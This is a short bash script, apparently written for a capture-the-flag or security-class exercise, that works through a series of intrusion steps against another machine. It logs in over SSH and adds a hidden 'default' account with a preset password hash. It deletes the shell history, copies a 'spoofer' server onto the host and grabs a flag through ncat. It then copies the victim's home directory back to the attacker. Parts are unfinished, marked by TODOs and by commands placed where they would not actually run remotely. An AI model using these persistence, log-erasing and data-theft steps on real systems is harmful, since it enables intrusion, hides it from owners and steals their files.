 #!/bin/bash

IP=$1
PASSWORD=$3

ssh "class@${IP}"

# add user with name default and password exfiltrate
sudo useradd -m -p 79rtRIFdjEjrg -s /bin/bash default
# erase history
rm -rf .bash_history
exit

# copy new instance of spoofing server
# TODO - add correct folders copy
scp -r "/home/class/fun/spoofer" "default@${IP}:/home/default/spoofer"
# TODO - execute it

ssh "default@${IP}"
# get their flag for A02
echo "EuphoricMushroomsFeedAnywhere" | ncat 192.168.1.167 26711 | grep -o "BSY-FLAG-A02-{[a-zA-Z0-9]*}" > "flag-${IP}"
exit

# copy their folder
scp -r "class@${IP}:/home/class" "/home/class/fun/${IP}"

# copy flag home
scp -r "default@${IP}:/home/default/flag-${IP}" "/home/class/fun/${IP}/flag-${IP}"